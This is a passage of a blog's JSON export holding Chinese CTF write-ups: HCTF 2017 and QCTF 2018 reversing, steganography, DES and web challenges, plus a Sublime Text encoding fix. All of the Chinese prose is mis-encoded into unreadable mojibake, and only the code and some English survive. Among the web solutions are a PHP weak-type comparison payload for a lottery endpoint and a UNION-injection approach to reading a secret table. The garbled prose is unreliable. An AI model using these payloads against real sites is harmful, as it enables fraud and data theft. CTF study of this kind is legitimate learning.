= i + 1; &#125; while ( (char)i &lt; n ); &#125; v4 = 0; if ( n &lt;= 0 ) return 1; v5 = 0; while ( byte_40A030[v5] == buf[v5] ) &#123; v5 = ++v4; if ( v4 &gt;= n ) return 1; &#125; return 0;&#125; æ ¹æ®é€»è¾‘å†™å‡ºè§£å¯†è„šæœ¬ 1234567891011121314enc = [0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F, 0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, 0x6D, 0x4C, 0x6E]flag = [0] * 19for i in range(len(enc)): if i == 18: flag[i] = chr(enc[i] ^ 0x13) else: if i % 2 == 1: t = enc[i] ^ i flag[i] = chr(t + i) else: t = enc[i] ^ i flag[i + 2] = chr(t)for i in range(len(flag)): print(flag[i], end='') Evr_1æ‹–è¿›idaï¼Œå‘ç°å †æ ˆä¸å¹³è¡¡ï¼Œä¸èƒ½f5ã€‚patchä¹‹ååç¼–è¯‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108__int64 main_0()&#123; int v0; // edx __int64 v1; // ST08_8 char v3; // [esp-14h] [ebp-130h] int v4; // [esp-10h] [ebp-12Ch] char *v5; // [esp-Ch] [ebp-128h] char *v6; // [esp-8h] [ebp-124h] signed int v7; // [esp-4h] [ebp-120h] char v8; // [esp+0h] [ebp-11Ch] bool v9; // [esp+Fh] [ebp-10Dh] char v10; // [esp+D7h] [ebp-45h] int i; // [esp+E0h] [ebp-3Ch] bool v12; // [esp+EFh] [ebp-2Dh] bool v13; // [esp+FBh] [ebp-21h] bool v14; // [esp+107h] [ebp-15h] HMODULE v15; // [esp+110h] [ebp-Ch] v15 = GetModuleHandleW(0); puts(\"Welcome to HCTF 2017\\n\\n\", v8); puts(\"Mark.09 is hijacking Shinji Ikari now...\\n\\n\", v8); puts(\"Check User: \\n\", v8); v7 = 256; v6 = Str; gets_str(\"%s\", Str, 256); if ( !check() ) &#123; show_fail_box(); exit(0); &#125; show_success_box(); puts(\"Check Start Code: \\n\", v7); v6 = (char *)128; v5 = input; gets_str(\"%s\", input, 128); while ( getchar() != 10 ) ; if ( check_len(input) != 35 ) &#123; fail_1(); fail_2(); exit(0); &#125; flag_trans_0((int)&amp;unk_41B570, (int)input); v4 = dword_41B780; useless((int)flag_trans_3, (int)sub_4111EA); if ( sub_411361(1) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_1, (int)sub_41139D) != 0; v14 = v9; flag_trans_1((int)byte_41B5F0, (int)&amp;unk_41B570); sub_411258(dword_41B770, dword_41B774, 204); if ( sub_411361(2) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_2, (int)sub_411046) != 0; v13 = v9; flag_trans_2((int)byte_41B670, (int)&amp;unk_41B570); sub_411258(dword_41B778, dword_41B77C, 205); if ( sub_411361(3) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_3, (int)sub_4111EA) != 0; v12 = v9; flag_trans_3((int)byte_41B6F0, (int)&amp;unk_41B570); sub_411258(dword_41B780, dword_41B784, 221); for ( i = 0; i &lt; 7; ++i ) &#123; byte_41B577[i] = byte_41B5F0[i]; byte_41B57E[i] = byte_41B670[i]; byte_41B585[i] = byte_41B6F0[i]; &#125; if ( flag_check(&amp;unk_41B570, &amp;enc_flag) ) &#123; MessageBoxA(0, \"&gt; DETONATION FUNCTION\\n READY\", \"WILLE\", 0); puts(\"[Y/N]?\\n\", v3); gets_str(\"%c\", &amp;v10, 1); if ( v10 != 89 &amp;&amp; v10 != 121 ) &#123; fail_1(); fail_2(); &#125; else &#123; sub_411082(); puts(\"Prevent IMPACT success\\n\", v3); &#125; &#125; else &#123; fail_1(); fail_2(); &#125; system(\"pause\"); HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1;&#125; å¯ä»¥åˆ¤æ–­å‡ºå‡½æ•°ç»è¿‡äº†å››æ¬¡åŠ å¯†ã€‚ trans0å°†æ¯ä¸ªå­—ç¬¦ä¸0x76å¼‚æˆ–ï¼š 123456789101112int __cdecl sub_411B30(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+D0h] [ebp-8h] for ( i = 0; i &lt; 35; ++i ) &#123; a1[i] = a2[i] ^ 0x76; result = i + 1; &#125; return result;&#125; trans1å¯¹ä»ç¬¬ä¸ƒä½å­—ç¬¦å¼€å§‹çš„è¿ç»­ä¸ƒä¸ªå­—ç¬¦è¿›è¡Œä¸€ç³»åˆ—å¼‚æˆ–å’Œç§»ä½æ“ä½œï¼š 12345678910111213int __cdecl sub_411D40(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 7] ^ 0xAD; a1[i] = 2 * a1[i] &amp; 0xAA | ((a1[i] &amp; 0xAA) &gt;&gt; 1); result = i + 1; &#125; return result;&#125; trans2ä¸trans1ç±»ä¼¼ï¼Œå¯¹ç¬¬åå››ä½èµ·è¿ç»­ä¸ƒä½è¿›è¡Œæ“ä½œï¼š 12345678910111213int __cdecl sub_411E40(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 14] ^ 0xBE; a1[i] = 4 * a1[i] &amp; 0xCC | ((a1[i] &amp; 0xCC) &gt;&gt; 2); result = i + 1; &#125; return result;&#125; trans3ä¹Ÿç±»ä¼¼ï¼Œå¯¹ä»äºŒåä¸€ä½èµ·çš„è¿ç»­ä¸ƒä½æ“ä½œã€‚ 12345678910111213int __cdecl sub_411F50(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 21] ^ 0xEF; a1[i] = 16 * a1[i] &amp; 0xF0 | ((a1[i] &amp; 0xF0) &gt;&gt; 4); result = i + 1; &#125; return result;&#125; æ ¹æ®ä»¥ä¸Šç¨‹åºé€»è¾‘ï¼Œå¯ä»¥å†™å‡ºçˆ†ç ´çš„è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243enc = [0x1E, 0x15, 0x02, 0x10, 0x0D, 0x48, 0x48, 0x6F, 0xDD, 0xDD, 0x48, 0x64, 0x63, 0xD7, 0x2E, 0x2C, 0xFE, 0x6A, 0x6D, 0x2A, 0xF2, 0x6F, 0x9A, 0x4D, 0x8B, 0x4B, 0x0A, 0x8A, 0x4F, 0x45, 0x17, 0x46, 0x4F, 0x14, 0x0B];flag = \"\"for i in range(7): flag += chr(enc[i] ^ 0x76)print flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xAD ch = ((2 * ch) &amp; 0xFF) &amp; 0xAA | (0xFF &amp; ((ch &amp; 0xAA) &gt;&gt; 1)) if ch == enc[7 + i]: flag += chr(tmp) breakprint flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xBE ch = ((4 * ch) &amp; 0xFF) &amp; 0xCC | (0xFF &amp; ((ch &amp; 0xCC) &gt;&gt; 2)) if ch == enc[14 + i]: flag += chr(tmp) breakprint flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xEF ch = ((16 * ch) &amp; 0xFF) &amp; 0xF0 | (0xFF &amp; ((ch &amp; 0xF0) &gt;&gt; 4)) if ch == enc[21 + i]: flag += chr(tmp) breakprint flagfor i in range(7): flag += chr(enc[28 + i] ^ 0x76)print flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"è§£å†³Macä¸‹sublime textä¸­æ–‡å‡ºç°ä¹±ç ","slug":"è§£å†³Macä¸‹sublime-textä¸­æ–‡å‡ºç°ä¹±ç ","date":"2018-07-26T11:04:36.000Z","updated":"2018-10-06T08:09:26.882Z","comments":true,"path":"2018/07/26/è§£å†³Macä¸‹sublime-textä¸­æ–‡å‡ºç°ä¹±ç /","link":"","permalink":"https://qianfei11.github.io/2018/07/26/è§£å†³Macä¸‹sublime-textä¸­æ–‡å‡ºç°ä¹±ç /","excerpt":"ç”¨äº†è¿™ä¹ˆä¹…macï¼Œç«Ÿç„¶ç¬¬ä¸€æ¬¡å‘ç°sublimeä¸èƒ½è§£ç ä¸­æ–‡å­—ä½“ã€‚","text":"ç”¨äº†è¿™ä¹ˆä¹…macï¼Œç«Ÿç„¶ç¬¬ä¸€æ¬¡å‘ç°sublimeä¸èƒ½è§£ç ä¸­æ–‡å­—ä½“ã€‚ 1ã€æ‰“å¼€æ§åˆ¶å°æ‰“å¼€sublimeï¼Œcontrol+~æ‰“å¼€æ§åˆ¶å°ã€‚ 2ã€ä¸‹è½½package controlå¦‚æœæ˜¯sublime text 2ï¼Œè¾“å…¥ï¼š 1import urllib2,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation') å¦‚æœæ˜¯sublime text 3ï¼Œè¾“å…¥ï¼š 1import urllib.request,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by) è¯¦æƒ…è§å®˜ç½‘ 3ã€ä¸‹è½½ConvertToUTF8é‡å¯sublimeã€‚command+shift+pï¼Œåœ¨è¾“å…¥æ¡†è¾“å…¥Package Control: Install Packageï¼Œå¾…è½½å…¥æ‰€æœ‰çš„åŒ…ç›®å½•åè¾“å…¥ConvertToUTF8ï¼Œå›è½¦å®‰è£…ã€‚ 4ã€å®‰è£…Codecs33å¦‚æœé‡å¯sublimeä¹‹åä»ç„¶æ— æ³•æ­£ç¡®è§£ç ï¼Œéœ€è¦ä¸‹è½½Codecs33ã€‚å°†ä¸‹è½½å®Œçš„å‹ç¼©åŒ…è§£å‹ï¼ŒæŠŠæ–‡ä»¶å¤¹çš„åå­—ä¿®æ”¹ä¸ºCodecs33å¹¶æ”¾åœ¨sublimeçš„packageç›®å½•ä¸‹ã€‚ é‡å¯ä¹‹åå°±å¤§åŠŸå‘Šæˆå•¦ã€‚","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://qianfei11.github.io/tags/mac/"},{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"2018-QCTF-writeup","slug":"ã€æœªå®Œæˆã€‘2018-QCTF-writeup","date":"2018-07-21T11:56:59.000Z","updated":"2019-01-25T07:46:31.089Z","comments":true,"path":"2018/07/21/ã€æœªå®Œæˆã€‘2018-QCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/07/21/ã€æœªå®Œæˆã€‘2018-QCTF-writeup/","excerpt":"å…¶å®å¤§éƒ¨åˆ†æ˜¯çœ‹ç€å¤§ä½¬wpçš„å¤ç°ã€‚æ„Ÿè§‰è‡ªå·±å®åŠ›è¿˜æ˜¯æ¬ ç¼ºå¾ˆå¤šã€‚","text":"å…¶å®å¤§éƒ¨åˆ†æ˜¯çœ‹ç€å¤§ä½¬wpçš„å¤ç°ã€‚æ„Ÿè§‰è‡ªå·±å®åŠ›è¿˜æ˜¯æ¬ ç¼ºå¾ˆå¤šã€‚ MISCpictureé€šè¿‡stegsolveåˆ¤æ–­å‡ºå­˜åœ¨æœ€ä½ä½éšå†™ã€‚ä½¿ç”¨lsbå·¥å…·è§£å‡ºå¯†æ–‡ï¼Œä¸ºä¸€æ®µåŠ å¯†å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293#_*_ coding:utf-8 _*_import reimport sysip= (58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9 , 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7)ip_1=(40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25)e =(32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12,13, 12, 13, 14, 15, 16, 17, 16,17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,24, 25, 26, 27, 28, 29,28, 29, 30, 31, 32, 1) p=(16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25)s=[ [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]] pc1=(57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4);pc2= (14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32)d = ( 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1)__all__=['desencode']class DES(): def __init__(self): pass def code(self,from_code,key,code_len,key_len): output=\"\" trun_len=0 code_string=self._functionCharToA(from_code,code_len) code_key=self._functionCharToA(key,key_len) if code_len%16!=0: real_len=(code_len/16)*16+16 else: real_len=code_len if key_len%16!=0: key_len=(key_len/16)*16+16 key_len*=4 trun_len=4*real_len for i in range(0,trun_len,64): run_code=code_string[i:i+64] l=i%key_len run_key=code_key[l:l+64] run_code= self._codefirstchange(run_code) run_key= self._keyfirstchange(run_key) for j in range(16): code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r code_r= self._functionE(code_r) key_l=run_key[0:28] key_r=run_key[28:56] key_l=key_l[d[j]:28]+key_l[0:d[j]] key_r=key_r[d[j]:28]+key_r[0:d[j]] run_key=key_l+key_r key_y= self._functionKeySecondChange(run_key) code_r= self._codeyihuo(code_r,key_y) code_r= self._functionS(code_r) code_r= self._functionP(code_r) code_r= self._codeyihuo(code_l,code_r) run_code+=code_r code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r+code_l output+=self._functionCodeChange(run_code) return output def _codeyihuo(self,code,key): code_len=len(key) return_list='' for i in range(code_len): if code[i]==key[i]: return_list+='0' else: return_list+='1' return return_list def _codefirstchange(self,code): changed_code='' for i in range(64): changed_code+=code[ip[i]-1] return changed_code def _keyfirstchange (self,key): changed_key='' for i in range(56): changed_key+=key[pc1[i]-1] return changed_key def _functionCodeChange(self, code): lens=len(code)/4 return_list='' for i in range(lens): list='' for j in range(4): list+=code[ip_1[i*4+j]-1] return_list+=\"%x\" %int(list,2) return return_list def _functionE(self,code): return_list='' for i in range(48): return_list+=code[e[i]-1] return return_list def _functionP(self,code): return_list='' for i in range(32): return_list+=code[p[i]-1] return return_list def _functionS(self, key): return_list='' for i in range(8): row=int( str(key[i*6])+str(key[i*6+5]),2) raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2) return_list+=self._functionTos(s[i][row][raw],4) return return_list def _functionKeySecondChange(self,key): return_list='' for i in range(48): return_list+=key[pc2[i]-1] return return_list def _functionCharToA(self,code,lens): return_code='' lens=lens%16 for key in code: code_ord=int(key,16) return_code+=self._functionTos(code_ord,4) if lens!=0: return_code+='0'*(16-lens)*4 return return_code def _functionTos(self,o,lens): return_code='' for i in range(lens): return_code=str(o&gt;&gt;i &amp;1)+return_code return return_codedef tohex(string): return_string='' for i in string: return_string+=\"%02x\"%ord(i) return return_string def tounicode(string): return_string='' string_len=len(string) for i in range(0,string_len,2): return_string+=chr(int(string[i:i+2],16)) return return_stringdef desencode(from_code,key): from_code=tohex(from_code) key=tohex(key) des=DES() key_len=len(key) string_len=len(from_code) if string_len&lt;1 or key_len&lt;1: print 'error input' return False key_code= des.code(from_code,key,string_len,key_len) return key_codeif __name__ == '__main__': if(desencode(sys.argv[1],'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf')=='e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'): print 'correct.' else: print 'try again.' è§£å‡ºæ¥ä¹‹åå‘ç°åº”è¯¥æ˜¯DESï¼Œä½†æ— ä»ä¸‹æ‰‹ã€‚åæ¥çœ‹äº†å­”å¸ˆå‚…çš„wpï¼Œä¸€æƒŠå±…ç„¶è¿˜æœ‰è¿™ç§éªšæ“ä½œã€‚ é¡ºä¾¿è®°å½•ä¸€ä¸‹__all__åœ¨pythonä¸­ï¼š 1The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a packageâ€™s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they donâ€™t see a use for importing * from their package. æœ€åç”¨æœåˆ°çš„è„šæœ¬è§£å¯†ï¼š 1234567$ python des_1.py DES è§£å¯†è¯·è¾“å…¥å¯†æ–‡ï¼ˆé•¿åº¦ä¸é™ï¼‰:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72è¯·è¾“å…¥å¯†é’¥ï¼ˆé•¿åº¦ä¸é™ï¼‰:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sfQCTF&#123;eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4&#125;æŒ‰ç¡®å®šé€€å‡º Noiseæ‹¿åˆ°ä¸€ä¸ªNoise.wavï¼Œå‘ç°æ˜¯my little pony theme songã€‚å°è¯•ç”¨mp3stegoåæ— æœã€‚å†åå¤å¬äº†å¾ˆå¤šæ¬¡ï¼Œå‘ç°æœ‰ä¸€äº›å™ªéŸ³å¤¹æ‚åœ¨é‡Œé¢ã€‚ çœ‹ä¸€ä¸‹hintï¼Œä¸ªäººè®¤ä¸ºè¿™é‡Œæœ€å…³é”®çš„æ˜¯hint2ï¼Œéœ€è¦äº†è§£é€šè¿‡æ¶ˆé™¤ä¼´å¥è·å¾—äººå£°çš„åŸç†ã€‚ å…³äºåŸç†ï¼Œåˆ©ç”¨å£°æ³¢å åŠ å¹²æ¶‰æ¶ˆé™¤åŸå£°ï¼Œå½“å£°æ³¢çš„ç›¸ä½å·®è¾¾åˆ°180åº¦çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¾¾åˆ°æ¶ˆéŸ³çš„æ•ˆæœï¼š è·Ÿç€æ•™ç¨‹å­¦ä¼šæ€ä¹ˆä½¿ç”¨Adobe Auditionï¼Œä½¿å£°æ³¢ç›¸ä½å·®è¾¾åˆ°180åº¦ã€‚ è¦æå–å‡ºå™ªéŸ³ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ä»ç½‘ä¸Šä¸‹è½½åŸç‰ˆçš„my little pony theme songï¼Œç„¶åå°†Noise.wavå’Œå®ƒçš„ç›¸ä½å·®è°ƒæ•´ä¸º180åº¦ï¼Œå°±å¯ä»¥æå–å‡ºå™ªéŸ³ã€‚ å…³äºè¿™æ®µå™ªéŸ³çš„è¯ï¼Œå’Œæ…¢æ‰«æç”µè§†æœ‰å…³ã€‚åˆ©ç”¨è½¯ä»¶MMSSTVï¼Œæœ€åå¾—åˆ°flagã€‚ X-man-Keywordä¹Ÿæ˜¯lsbã€‚ å¯†ç ä¸ºå›¾ç‰‡ä¸­çš„lovekfcã€‚ é€šè¿‡æç¤ºï¼Œå°†LOVEKFCä½œä¸ºå…³é”®å­—æåˆ°æœ€å‰é¢ï¼Œå’Œæ­£å¸¸é¡ºåºçš„è‹±æ–‡å­—æ¯è¿›è¡Œç½®æ¢ã€‚ 1234567PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;LOVEKFCABDGHIJMNPQRSTUWXYZABCDEFGHIJKLMNOPQRSTUVWXYZQCTF...// å®¹æ˜“å‘ç°å‰å››ä½æ­£å¥½æ˜¯QCTF å†™ä¸€ä¸‹è„šæœ¬è·‘å‡ºç»“æœï¼š 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;int main() &#123; char s1[27] = \"lovekfcabdghijmnpqrstuwxyz\"; char s2[27] = \"abcdefghijklmnopqrstuvwxyz\"; char s3[27] = \"LOVEKFCABDGHIJMNPQRSTUWXYZ\"; char s4[27] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; char ans[39] = \"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;\"; for(int i = 0; i &lt; strlen(ans); i++) &#123; if(islower(ans[i])) &#123; for(int j = 0; j &lt; strlen(s1); j++) &#123; if(ans[i] == s1[j]) &#123; ans[i] = s2[j]; break; &#125; &#125; &#125; else if(isupper(ans[i])) &#123; for(int j = 0; j &lt; strlen(s3); j++) &#123; if(ans[i] == s3[j]) &#123; ans[i] = s4[j]; break; &#125; &#125; &#125; else &#123; continue; &#125; &#125; printf(\"%s\", ans); return 0;&#125; X-man-A faceè¡¥å…¨äºŒç»´ç å®šä½ç¬¦ï¼Œæ‰«å‡ºä¸€ä¸²ç±»ä¼¼base64çš„å¯†æ–‡ã€‚ ç»è¿‡å°è¯•ï¼Œé€šè¿‡base32è§£ç å¾—åˆ°flagã€‚ WEBLotteryé€šè¿‡GitHackæ‹¿åˆ°æºç ï¼Œåœ¨api.phpä¸­ï¼š 123456789101112function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; $numberså³ç”¨æˆ·è¾“å…¥çš„æ•°å­—ï¼Œ$win_numberså³éšæœºç”Ÿæˆçš„æ•°å­—ã€‚æ ¹æ®PHPå¼±ç±»å‹æ¯”è¾ƒï¼Œä¾‹å¦‚TRUEå’Œ1å’Œ&quot;1&quot;ç›¸ç­‰ï¼Œæ„é€ &quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]å³å¯ä¸­æœ€é«˜å¥–ï¼Œå¾—åˆ°flagã€‚ NewsCenterç›´æ¥ç”¨è”åˆæ³¨å…¥åˆ¤æ–­å‡ºåˆ—æ•°ä¸ºä¸‰åˆ—åï¼Œå°±å¼€å§‹èµ°æµç¨‹emmmã€‚ æ˜¾è€Œæ˜“è§flagåº”è¯¥åœ¨secret_tableä¸­ã€‚ åœ¨fl4gåˆ—ä¸­å¾—åˆ°flagï¼š REXman-babymipsmipsé€†å‘ï¼Œçœ‹ä¸€ä¸‹swingçš„åšå®¢ï¼Œå®‰è£…ä¸€æ³¢retdecæ¥åç¼–è¯‘ã€‚ åç¼–è¯‘å‡ºå‡ ä¸ªå…³é”®å‡½æ•°ï¼š checkå‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t puts(char * a1);int32_t strlen(char * a1);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(char * a1);// --------------------- Global Variables ---------------------char * g1 = \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";// ------------------------ Functions -------------------------// Address range: 0x4007f0 - 0x4009a8int32_t sub_4007F0(char * a1) &#123; int32_t v1 = (int32_t)a1; // 0x400800 char * str = (char *)v1; // 0x400800 int32_t puts_rc; if (strlen(str) &lt;= 5) &#123; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc; &#125; int32_t v2 = 5; while (true) &#123; char * v3 = (char *)(v2 + v1); // 0x4008a8 int32_t v4 = (int32_t)*v3; // 0x4008a8 char v5; if (v2 % 2 == 0) &#123; char v6 = *v3; // 0x4008cc v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000; // branch -&gt; 0x400900 &#125; else &#123; // 0x400828 v5 = 64 * 